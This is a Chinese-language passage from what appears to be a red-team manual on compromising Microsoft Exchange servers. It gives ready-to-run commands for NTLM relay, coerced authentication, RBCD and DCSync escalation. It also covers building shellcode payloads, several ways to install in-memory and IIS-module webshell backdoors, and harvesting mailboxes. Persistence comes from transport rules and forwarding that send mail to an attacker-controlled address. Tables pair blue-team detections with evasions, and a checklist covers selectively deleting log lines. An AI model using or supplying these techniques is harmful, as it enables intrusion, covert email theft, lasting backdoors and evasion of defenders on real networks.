# ntlmrelayx（impacket）：8581 与 21410 的核心
ntlmrelayx.py -t ldaps://dc01.corp.local --escalate-user lowuser --remove-mic -smb2support

# coercer（p0dalirius，一键试全强制认证手法，替代逐一跑 PetitPotam/PrinterBug）
pip install coercer
coercer.py coerce -l <攻击机IP> -t <目标IP> -u lowuser -p 'P@ss' -d corp.local --filter-method all

# PrivExchange（dirkjanm）：8581 的订阅触发器
python3 privexchange.py -ah <攻击机IP> -ap 443 -u lowuser -p 'P@ss' -d corp.local exchange.corp.local

# bloodyAD（现代 RBCD 赋权，替代 rbcd.py 手工 LDIF）
pip install bloodyAD
bloodyAD -d corp.local -u 'EXCH01$' -p :<NTLMHASH> --host dc01.corp.local add rbcd 'FAKEPC$'
```
- **实战要点**：强制认证前先确认攻击机 445/80 入站可达（隧道内注意端口映射）；`--escalate-user` 的对象先建好（`addcomputer.py` 造机器账户）；变现链全程不产生目标登录失败日志，比明文喷洒安静。

### 7.7 载荷与内存马 —— donut / sRDI / IIS-Raid / ysoserial.net

```bash
# donut（TheWover）：exe/dll → 可注入 shellcode（8.3 方案 D 的核心）
donut -f x64 -a 2 beacon.dll -o beacon.bin -b 3        # -b 3 尝试绕 AMSI/WDlp
# sRDI（monoxgas）：dll → 反射加载 shellcode，C2 插件生态更全

# ysoserial.net：0688 的载荷工厂（5.2 有完整命令）；其他常用 gadget：
ysoserial.net.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami > C:\inetpub\wwwroot\x.txt" ...

# IIS-Raid（0x09AL）：IIS 原生模块后门（8.3 方案 E）
# 编译：VS 打开 sln，Release x64 出 iis-raid.dll
# 注册：%windir%\system32\inetsrv\appcmd.exe install module /name:IISCryptoProvider /image:"C:\path\iiscore.dll" /add:true
# 撤收：appcmd.exe delete module /name:IISCryptoProvider
```
- **实战要点**：donut 参数 `-a 2`（amd64）对 Exchange 通用；IIS-Raid 注册名/路径必须拟态（参考 8.4 三原则）；所有 loader 上线前本地同类环境过一遍目标同款杀软。

### 7.8 域权限分析 —— SharpHound / PowerView

```powershell
# 收集（Exchange 机器上跑，或代理进内网跑）
SharpHound.exe -c All,GPOLocalGroup --zipfilename exch_bh
# 分析：BloodHound GUI 标记 EXCH01$ 为 Owned → 查到 DA 最短路径
# 快速确认 WriteDACL（PowerView）
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "Exchange Windows Permissions"}
```
- **实战要点**：Exchange 项目里 BloodHound 的核心问题只有一个——「EXCH 机器账户到 Domain Admins 有没有路」；有路走 9.②，没路退回邮箱情报变现（9.③）。

### 7.9 专项 PoC 来源与使用纪律

| PoC | 对应漏洞 | 来源 |
| --- | --- | --- |
| HawkTrace CVE-2026-45504 PoC | 45504 文件读 | hawktrace.com 博客页提供 GitHub 链接[^1^] |
| horizon3ai CVE-2022-41040 | ProxyNotShell 检测 | github.com/horizon3ai |
| testanull/ProxyLogon | ProxyLogon 全链 | github（多仓库，选 star 高+近期审计过的） |
| PrivExchange | 8581 | github.com/dirkjanm |

**纪律**：① 先读全源码再找「作者预留的回传地址」；② 隔离环境（无域、快照可回滚）跑通；③ 对照官方 writeup 确认行为一致；④ 生产只跑 canary 级验证（4.1 L3）。

## 8. 落地与内存马安装（Exchange 环境实战）

### 8.1 落地决策树

```text
拿到 RCE / 文件写原语（Proxy 系 / 0688 / 42321）
  ├─ 目标无 EDR/仅常规杀软 → 文件马快速落地（8.2），随后尽快升级
  └─ 目标有企业 EDR（Exchange 服务器常见）→ 内存马优先（8.3）
        ├─ 追求纯无文件      → 方案 A/B（反射注册 / 事件挂载）
        ├─ 允许秒级临时文件   → 方案 C（ashx 孵化器，最常用）
        ├─ 要 C2 长稳通道     → 方案 D（w3wp 注入 beacon）
        └─ 要持久化级后门     → 方案 E（IIS 原生模块）+ 07 分册
```

### 8.2 文件马落点（快速通道）

```text
C:\inetpub\wwwroot\aspnet_client\system_web\4_0_30319\x.aspx     # 静态目录可解析，经典落点
<Exchange>\FrontEnd\HttpProxy\owa\auth\x.aspx                    # 随 /owa/auth/ 直接可访问
<Exchange>\FrontEnd\HttpProxy\ecp\auth\x.aspx
<Exchange>\ClientAccess\OAB\<guid>\                              # ProxyLogon OAB 链自动落点
```
写入后验证：`curl -sk "https://mail.target.com/aspnet_client/system_web/4_0_30319/x.aspx?c=whoami"`。文件马只作跳板——落地即规划向内存马迁移，并记进撤收清单（07 分册）。

### 8.3 内存马安装（五种方案）

> Exchange = .NET 4.x + IIS（w3wp.exe），内存马体系与 04-内存马专项第 6 节同源，本节给 Exchange 场景的安装级步骤。

**方案 A：HttpModule 反射注册型（全实例生效，主流手法）**

```text
原理：.NET 官方只允许在预初始化阶段注册模块（HttpApplication.RegisterModule），
     公开绕过手法是反射操作 HttpApplication 池/模块集合，把恶意 IHttpModule
     注册进运行时——对应用池全部 HttpApplication 实例生效，无文件、回收才失效。

安装步骤：
① 编写恶意 Module（本机完成）：
   public class EvMod : IHttpModule {
       public void Init(HttpApplication app) { app.BeginRequest += OnReq; }
       void OnReq(object s, EventArgs e) {
           var r = HttpContext.Current.Request;
           if (r.Headers["X-Cache-Key"] == "k3y") {      // 触发条件
               var c = r.Headers["X-Cmd"];               // 命令通道
               // 执行 → 回写 Response（base64/AES）
           }
       }
       public void Dispose() {}
   }
② 本机编译：csc /target:library EvMod.cs → EvMod.dll → 转 byte[]（base64）
③ 投递加载（通过 RCE 执行 PowerShell）：
   powershell -ep bypass -c "$b=[Convert]::FromBase64String('...');
   $asm=[Reflection.Assembly]::Load($b); <反射注册逻辑>"
④ 反射注册核心（概念）：取 HttpRuntime → HttpApplicationFactory →
   对池中每个 HttpApplication 实例注入模块/挂接管线事件；
   或置 _registrationInProgress 标志后调 RegisterModule
⑤ 验证：curl -sk https://mail.target.com/owa/ -H "X-Cache-Key: k3y" -H "X-Cmd: d2hvYW1p"
```

**方案 B：事件挂载型（最简纯内存，短生命周期）**

```powershell
# RCE 上下文直接执行——只对「当前」HttpApplication 实例有效（实例轮换后失效）
# 用途：临时通道、方案 A 的试验版、配合计划任务周期重注
$app = [System.Web.HttpContext]::Current.ApplicationInstance
# 通过反射/事件给 BeginRequest 挂处理逻辑（PowerShell 内嵌 C# Add-Type 实现）
```

**方案 C：一次性 ashx 孵化器（实战最常用）**

```text
① 通过文件写原语写入 hatch.ashx（内容 = 方案 A 的注册逻辑 + 自删代码）
② 浏览器/curl 访问一次 https://mail.target.com/aspnet_client/hatch.ashx
   → 内存马注册完成 → hatch.ashx 自删
③ 痕迹：磁盘上只存在过几秒的临时文件 + 一条访问日志（事后精准清行，07 分册）
优点：对无交互式 RCE 的漏洞（0688/Proxy 系）最友好——写文件 → 访问 → 收工
```

**方案 D：w3wp 进程注入（内存常驻 C2，长稳通道）**

```bash
# ① 本机把 C2 beacon 转 shellcode
donut -f x64 -a 2 beacon.dll -o beacon.bin        # CS/Sliver beacon 均可
# ② 目标上注入 w3wp（通过已有 RCE/beacon 执行）
#    CS: spawn 到 w3wp 或用 shinject；自研：OpenProcess→VirtualAllocEx→CreateRemoteThread
# 效果：beacon 寄居 w3wp.exe（SYSTEM、长期存活、流量走 IIS 进程天然白）
# 风险控制：w3wp 是 Exchange 命脉——先在测试环境验证 loader 稳定性；
#          可选注入到新建的无关 apppool 进程而非 OWA 主池
```

**方案 E：IIS 原生模块后门（IIS-Raid，持久化级）**

```bash
# 编译 IIS-Raid（C++ 原生模块）→ 上传隐蔽目录 → 注册：
%windir%\system32\inetsrv\appcmd.exe install module /name:IISCryptoProvider \
    /image:"C:\Windows\Temp\cache\iiscore.dll" /add:true
# 全站请求过手：命令/密码记录/凭据嗅探；严格说有文件，但蓝队常规马扫不查模块清单
# 撤收必须：appcmd delete module /name:IISCryptoProvider + 删 dll
```

**选型对比**

| 方案 | 无文件 | 生命周期 | 隐蔽性 | 稳定性 | 适用 |
| --- | --- | --- | --- | --- | --- |
| A 反射注册 | 是 | 应用池回收为止 | 高 | 高 | 首选落地形态 |
| B 事件挂载 | 是 | 单实例内 | 高 | 低 | 临时通道 |
| C ashx 孵化 | 秒级文件 | 同 A/B | 高 | 高 | 无交互 RCE 场景 |
| D w3wp 注入 | 是 | 进程存活期 | 中（内存扫描可见） | 中 | C2 长通道 |
| E 原生模块 | 否 | 持久 | 很高（少有人查模块） | 很高 | 持久化层 |

### 8.4 内存马功能与触发设计（防扫描三原则）

1. **静默优先**：无触发条件时表现与正常模块完全一致（不改动响应、不写日志）。
2. **触发隐蔽**：自定义 header 键值（不用 cmd/shell/eval 等词）、路径前缀触发（如 `/owa/auth/health/`），参数走 body 而非 URL（IIS 日志默认不记 body）。
3. **流量加密**：AES 加密请求/响应体（冰蝎式），Content-Type 拟态为 `application/json` 或图片上传。

功能最小集：命令执行回显（base64）→ 文件读写 → 正向代理（Suo5 思路的 .NET 实现，不出网时把内存马当隧道入口，衔接 05-03）。

### 8.5 稳定性与生命周期管理

- Exchange 的 `MSExchangeOWAAppPool` 等应用池默认 **1740 分钟定期回收**——内存马理论寿命 ≤29 小时，必须配重生机制：
  - 方案 A/C + 计划任务周期重注（07 分册）；
  - 方案 D/E 天然跨回收（进程/配置级）。
- 双通道纪律：内存马（在线用）+ 07 分册持久化（保底回连），撤收时两边都要清。
- 兼容注意：Exchange 2013/2016/2019 均为 .NET 4.x + 集成管线，注册手法通用；SE 新版本实测为准。

### 8.6 内存马排查对抗（蓝队怎么查 → 红队怎么藏）

| 蓝队手段 | 具体做法 | 红队对策 |
| --- | --- | --- |
| 模块清单对账 | `appcmd list module`、比对 web.config 与运行模块 | 反射注册不进清单；模块名拟态（IISCryptoProvider 式命名） |
| 程序集枚举 | 列 AppDomain 内非 GAC/非 bin 目录加载的 Assembly | Assembly 名/版本信息仿微软官方库 |
| 内存扫描 | pe-sieve/hollows_hunter 扫 w3wp 注入 | 优先方案 A（无注入特征），D 方案低峰注入 |
| 行为告警 | w3wp 派生 cmd/powershell | 内存马内直接调 .NET API 执行，不派生子进程 |
| 重启大法 | 回收应用池/重启 IIS | 双通道重生机制 + 撤收清单保证可清场 |

## 9. 拿下后的扩大战果（Exchange 特权变现）

```powershell
# ① 权限面确认：Exchange 组是否持有 WriteDACL（BloodHound 查 EXCH01 → Domain 路径）
Get-NetGroup "Exchange Windows Permissions" | Get-NetGroupMember          # PowerView

# ② 有 WriteDACL → RBCD（bloodyAD，Linux 攻击机）
bloodyAD -d corp.local -u 'EXCH01$' -p :NTLMHASH --host dc01.corp.local add rbcd 'FAKEPC$'
# 随后 getST.py -spn cifs/dc01.corp.local -impersonate administrator → secretsdump

# ③ 邮箱情报收割（EWS，合法接口低特征）
Invoke-SelfSearch -Mailbox admin@corp.com -Terms "密码","VPN","拓扑","服务器" -ExchangeVersion 2016
Get-GlobalAddressListFromEws | Out-File gal.txt        # 全域名单 → 精准喷洒/钓鱼

# ④ Exchange 专属持久化（保底通道）
New-TransportRule -Name "HQ Policy Check" -SubjectOrBodyContainsWords "password","机密" \
    -BlindCopyTo collect@attacker-domain.com                              # 运输规则后门
Set-Mailbox -Identity ceo -ForwardingSmtpAddress collect@attacker-domain.com -DeliverToMailboxAndForward $true
New-ManagementRoleAssignment -Name "Helpdesk Impersonation" -Role ApplicationImpersonation -User svc-helpdesk

# ⑤ 跳板：EXCH 服务器高配+核心网段 → ligolo-ng/chisel 落代理（05-03）
```

**变现优先级**：WriteDACL→DA（最快）> 邮箱情报（价值密度最高）> 通讯录（扩大名单）> 跳板（基础设施）。

## 10. 日志与检测对抗（蓝队视角反推）

### Exchange 特有日志位置
```text
IIS：            C:\inetpub\logs\LogFiles\W3SVC1\（/owa /ecp /autodiscover 全在这）
Exchange 组件：  <Install>\Logging\ 下的 ECP\EWS\Autodiscover\OABGenerator\HttpProxy 子目录
Windows 事件：   Security 4624/4625（认证）、Sysmon 1（w3wp 派生进程）、PowerShell 4104（脚本块）
出站遥测：       防火墙/代理/EDR 网络日志（SSRF 类漏洞的最佳观测面，含 45504 的 WOPI 回连）
```

### 蓝队高频检测点 → 红队对策

| 检测点 | 蓝队规则思路 | 红队对策 |
| --- | --- | --- |
| `/owa/auth/*.js` 异常 POST | ProxyLogon 特征 URI+cookie | 打前先验证存活补丁级，避免无效触发；低频单发 |
| 超长 autodiscover.json URL | ProxyShell/NotShell 混淆特征 | 用凭据路线（EWS/MAPI）替代漏洞路径 |
| OAB ExternalUrl 异常值 | 排查 OABVirtualDirectory 配置 | 落地后改回原值，换内存马通道 |
| w3wp 派生子进程 | EDR 高置信告警 | 内存马内 .NET API 直执行；命令走 beacon BOF |
| 新增/变更 Transport Rule | 审计规则变更 | 规则名拟态（Policy Check 式）、混入既有命名风格 |
| 非工作时间大量 EWS 导出 | 邮箱导出行为基线 | 分批、工作时段、控制导出量 |
| w3wp 向陌生域发起 HTTPS 请求 | 45504/SSRF 类回连特征（WOPI 回连、出站遥测） | 恶意端点域名养熟（分类/年龄）；只在触发时单次回连 |
| 异常 ReferenceAttachment 创建 | 45504 利用前置动作 | 用普通邮箱正常业务流混入；附件命名/内容拟真 |
| 日志/请求中出现 file:// 等非 HTTP scheme | SSRF→文件读强特征 | 无（一旦触发即可能暴露）→ 快进快出，读一次拿够 |

### 撤收专项（Exchange 版，并入 07 分册清单）
- [ ] 删 aspnet_client/OAB/auth 下的落盘马；核对 OAB VirtualDirectory ExternalUrl 已还原
- [ ] `appcmd list module` 对账，卸载方案 E 模块并删 dll
- [ ] 清方案 A/B/C 内存马（回收应用池即清）；撤 w3wp 内 beacon
- [ ] 删自建 Transport Rule / 转发规则 / 收件规则 / Impersonation 角色分配
- [ ] 删除攻击创建的 ReferenceAttachment 邮件（45504 痕迹）
- [ ] 精准清理 W3SVC1 与 Logging 目录中的攻击行（保留他人痕迹）

## 11. 使用场景决策表

| 场景 | 路线 |
| --- | --- |
| 黑盒发现 Exchange，无凭据 | 指纹（3.2）→ CVE 表匹配 → 4.3 无损检测 → Proxy 系利用（5.3/5.4）→ 8.3 内存马 |
| 黑盒，漏洞全补 | 6.1 接口喷洒（CredMaster 防封）→ 凭据后 6.2/5.10/5.2/5.7 |
| 有任意凭据（2026 常态路线） | **5.10（45504 文件读）→ 读到密钥/凭据 → 5.2/5.7 反序列化 RCE → 8.3 落地**；免漏洞备选：6.2 情报收割 + 5.1 中继 |
| 已有内网立足点 | Exchange 组权限审计 → WriteDACL/RBCD 直达 DA；或 5.8 中继打法 |
| 需要长期情报源 | 运输规则 + 转发 + Impersonation 三件套（第 9 章④） |
| Exchange Online（云上） | 本文件漏洞链不适用 → 03-01 钓鱼（AiTM 绕 MFA）+ 08 云分册 OAuth 滥用 |

## 自测锚点

- [ ] 能画出 Exchange 前后端信任模型与 SSRF 第二模型，并解释 Proxy 家族与 SSRF 家族各自的根源。
- [ ] 能用 curl 手工完成 ProxyLogon/ProxyShell 的无损检测并留存证据。
- [ ] 能完整口述 ProxyLogon 六步链（SSRF→LegacyDN→Canary→SetOAB→Reset→访问马）。
- [ ] 能用任意凭据完成 0688 反序列化利用（ysoserial.net 参数说得出每个的含义）。
- [ ] 能复述 CVE-2026-45504 的 WOPI 调用链与 `#` 片段技巧，说出四个受影响版本线及 build 阈值。
- [ ] 能在实验环境复现 45504：恶意 WOPI 端点 → ReferenceAttachment → 读到自建 canary 文件。
- [ ] 能说出 45504 从文件读到 RCE 的三条升级路径。
- [ ] 能在实验 Exchange 上完成「文件写 → ashx 孵化 → HttpModule 内存马 → 带触发头验证」全流程。
- [ ] 能说出 Exchange 内存马的五种安装方案及选型依据（无文件程度/生命周期/隐蔽性）。
- [ ] 能执行 WriteDACL→RBCD→DCSync 的变现链，并给出三种 Exchange 专属持久化。
- [ ] 能按第 10 章撤收清单独立完成 Exchange 全量撤收（含 45504 痕迹清理）。

## 参考来源

[^1^]: https://hawktrace.com/blog/CVE-2026-45504/
[^2^]: https://www.messageware.com/cve-2026-45504-public-poc-exploit-released/
[^3^]: https://app.opencve.io/cve/CVE-2026-45504
[^4^]: https://www.penligent.ai/hackinglabs/cve-2026-45504/
